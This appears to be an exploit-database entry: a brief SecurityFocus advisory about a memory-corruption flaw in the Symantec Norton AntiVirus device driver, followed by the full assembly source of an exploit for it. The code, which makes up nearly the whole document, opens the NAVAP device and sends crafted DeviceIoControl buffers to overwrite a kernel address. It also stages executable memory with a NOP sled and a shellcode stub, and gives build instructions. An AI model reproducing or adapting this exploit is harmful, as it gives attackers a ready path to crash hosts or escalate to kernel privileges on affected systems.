@@ -1,0 +1,201 @@
+source: http://www.securityfocus.com/bid/8329/info
+
+It has been reported that a memory corruption vulnerability affects the Symantec Norton AntiVirus Device Driver. According to the report, one of the device control operation handlers attempts to write data to an address offset from a pointer parameter passed to DeviceIoControl(). There is no validation on the parameter supplied or the address written to. This vulnerability can be exploited by unprivileged userland programs to crash the affected host or potentially elevate privileges.
+
+;------------------------[NAVAP_EXPLOIT.ASM]--------------------------------------
+; NAVAP (Norton AntyVirus Device Driver Exploit)
+; powered by Lord YuP / Sec-Labs ^ Tkt
+; email: yup@tlen.pl
+
+;compile with:
+;tasm32 /m1 /m3 /mx NAVAP_EXPLOIT,,;
+;tlink32 -Tpe -aa NAVAP_EXPLOIT,NAVAP_EXPLOIT,,import32.lib,,
+;PEWRSEC.COM NAVAP_EXPLOIT.exe
+
+include my_macro.inc ;this can be found in zipped archive 
+include WIN32API.INC ;see the end of paper
+
+
+;WARNING THIS VALUE MUST BE CHANGED!!!! TRY TO USE DeviceTree utility (from OSR)
+;to obtain the *Device Loaded Address* !!!!
+;or make your own obtainer using SETUPAPI functions!!!
+
+MAP_BASE equ 0bbf30000h ;0bbef4000h
+
+
+;calculate the address for the shellcode
+mov eax,MAP_BASE
+add eax,3098eh ;first case-if offset without base addr
+mov dword ptr [my_address],eax ;fill the variable
+mov dword ptr [my_address+2],0 ;like NAVAP does X-D
+mov dword ptr [my_address+2],32h ;guess what ;) 
+
+push 0 
+push 80h 
+push 3 
+push 0 
+push 0 
+push 0 
+@pushsz "\\.\NAVAP" ;open the device
+@callx CreateFileA ;yeah - open it!
+mov ebx,eax ;EBX=DEVICE HANDLE
+
+cmp eax,-1 ;error ;/
+jne _x00 ;if not jump to _x00 label
+
+@debug SPLOIT_TITLE,"Cannot open device ;/",IERROR
+jmp exit
+
+_x00:
+push 0 ;overlapped = 0
+push offset byte_ret ;bytes returned
+push 4h ;navap requires 4 bytes ;)
+push offset outer ;output buffor
+push 20h ;if else our signal will be ignored
+push offset my_buffer ;input buffer (symantec style)
+push 222a87h ;secret code X-D
+push ebx ;EBX=HANDLE
+@callx DeviceIoControl ;send first signal
+test eax,eax ;cannot send it ;/ - damn
+jnz _x01 ;if correct jump to _x01
+
+@debug SPLOIT_TITLE,"Cannot send 1st SIGNAL! ;/",IERROR
+jmp exit
+
+_x01:
+push PAGE_EXECUTE_READWRITE ;page for execute/read/write
+push MEM_COMMIT ;commit
+push shellcode_size+100+(1000h+10h) ;size X-D hehe 
+push dword ptr [my_address] ;specyfic address
+@callx VirtualAlloc ;alloc it!
+mov dword ptr [mem_handle],eax ;store to variable
+
+test eax,eax ;error?
+jnz _xO ;if not jump to _xO
+
+@debug SPLOIT_TITLE,"Cannot alloc memory! ;/",IERROR
+jmp exit
+
+_xO:
+mov edi,eax ;EDI=MEMORY HANDLE
+push edi ;store EDI
+add eax,shellcode_size+10 ;after shellcode
+mov dword ptr [wpisz_tutaj],eax ;store for later
+
+xor eax,eax ;EAX=0
+mov ecx,shellcode_size+100 ;ECX=SHELLCODE SIZE + 100 bytes
+rep stosb ;fill up with NULL's
+pop edi ;load EDI (now EDI memory handle)
+
+
+lea esi,my_buffer2 ;ESI=POINTER TO SECOND BUFFER
+mov ecx,my_buffer2_size ;ECX=SECOND BUFFER SIZE
+rep movsb ;write it!!!
+
+mov al,90h ;AL=90H=NOP
+mov ecx,1000h+10h ;ECX=1010h bytes
+rep stosb ;FILL THE MEMORY WITH NOPS
+
+lea esi,shellcode ;ESI=POINTER TO REAL SHELLCODE
+add esi,my_buffer2_size ;(WITHOUT MY_BUFFER2 DATA)
+mov ecx,shellcode_size-my_buffer2_size ;ECX=REAL SHELLCODE SIZE 
+rep movsb ;store it!
+
+
+mov eax,dword ptr [mem_handle] ;EAX=MEMORY HANDLE
+add eax,shellcode_size+10 ;calculate pointer for bytes_returned
+
+
+push 0
+push eax ;bytes returned
+push 4h ;look up for comments! X-D
+push eax
+push 20h
+push dword ptr [mem_handle]
+push 222a87h
+push ebx
+@callx DeviceIoControl ;send second signal and execute the jump X-D
+test eax,eax ;error
+jnz _x02 ;nope conitnue work at _x02 label
+
+@debug SPLOIT_TITLE,"Cannot send 2nd SIGNAL! ;/",IERROR
+jmp exit
+
+
+
+_x02:
+push MEM_RELEASE ;memory will be released
+push shellcode_size+100+(1000h+10h) ;memory size
+push dword ptr [mem_handle] ;memory handle
+@callx VirtualFree ;de-allocate it
+
+exit: push 0 ;say good bye ;)
+@callx ExitProcess
+
+
+byte_ret dd 0
+
+
+OVERWRITE_IT equ MAP_BASE+20b12h+2 ;address to overwrite
+SAFE_EXIT equ MAP_BASE+20B0Bh ;do not fault ;][;
+
+my_buffer: 
+dd 03E3E5352h ;some MARKER by symantec
+dd 07h+1 ;case if
+dd "nie1" ;doesn't metter in this case
+dd "nie2" ;-//-
+dd offset nie3 ;device must store sth (avoid fault)
+dd 32h ;must be 32h!!! (read the white-paper)
+dd OVERWRITE_IT ;address we want to overwrite (EDX)
+dd 03C3C5352h ;the same as the first one
+my_buffer_size=$-offset my_buffer
+
+
+shellcode: 
+my_buffer2:
+dd 03E3E5352h
+dd 0h+1 ;case if
+dd "nie1" ;rest the same X-D 
+dd "nie2" 
+dd offset nie3 
+dd 32h
+wpisz_tutaj dd 0 
+dd 03C3C5352h
+my_buffer2_size=$-offset my_buffer
+db 100 dup (90h)
+
+
+;------------------------------------------------------------------------------------------
+;here the sample shellcode starts:
+;
+;If u want write a shellcode do it yourself, avoiding from ex-ploit-k1dd13z
+;blackhat for ever man ;]
+;btw. remeber that IT IS A: *D - R - I - V - E - R *
+;heh
+;------------------------------------------------------------------------------------------
+
+pushad
+@delta2reg ebp
+
+
+
+popad
+mov edx,SAFE_EXIT
+jmp edx
+
+
+shellcode_size=$-offset shellcode
+
+
+;the rest of variables
+
+mem_handle dd 0
+my_address dd 0
+temp_erufka dd 0
+nie3 db "just an temp ... "
+outer db 100 dup (0)
+
+
+end start
+
+;------------------------[NAVAP_EXPLOIT.ASM]--------------------------------------
